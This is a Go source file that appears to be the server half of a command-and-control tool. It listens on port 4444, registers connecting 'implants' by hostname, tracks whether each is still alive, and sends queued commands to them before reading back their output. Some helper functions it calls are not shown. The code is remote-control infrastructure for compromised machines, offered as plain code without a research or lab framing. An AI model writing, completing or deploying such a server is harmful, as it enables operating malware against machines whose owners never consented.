package main

import (
	"bufio"
	"log"
	"net"
	"strings"
	"time"
)

type implantID struct {
	Hostname string
	Active   bool
}

var implant implantID

var lastSeen time.Time

func initalizeServer() {
	listen, err := net.Listen("tcp", ":4444")
	if err != nil {
		log.Fatal("[-] Error", err)
	}

	defer listen.Close()

	for {
		conn, err := listen.Accept()
		if err != nil {
			log.Println("[-] Error accepting connection")
			continue
		}

		go handleImplants(conn)
	}
}

func checkImplantStatus() {

	for {
		time.Sleep(10 * time.Second)
		if time.Since(lastSeen) > 30*time.Second {
			implant.Active = false
		} else {
			implant.Active = true
		}
	}
}

func GetHostname(reader *bufio.Reader) string {
	hostname, err := reader.ReadString('\n')
	if err != nil {
		return "unknown"
	}
	return strings.TrimSpace(hostname)

}

func handleImplants(conn net.Conn) {
	defer conn.Close()
	reader := bufio.NewReader(conn)
	hostname := GetHostname(reader)
	implant = implantID{
		Hostname: hostname,
		Active:   true,
	}

	if pendingCommand != "" {
		sendCommands(conn)
		pendingCommand = ""
		receiveOutput(reader)
	}
}
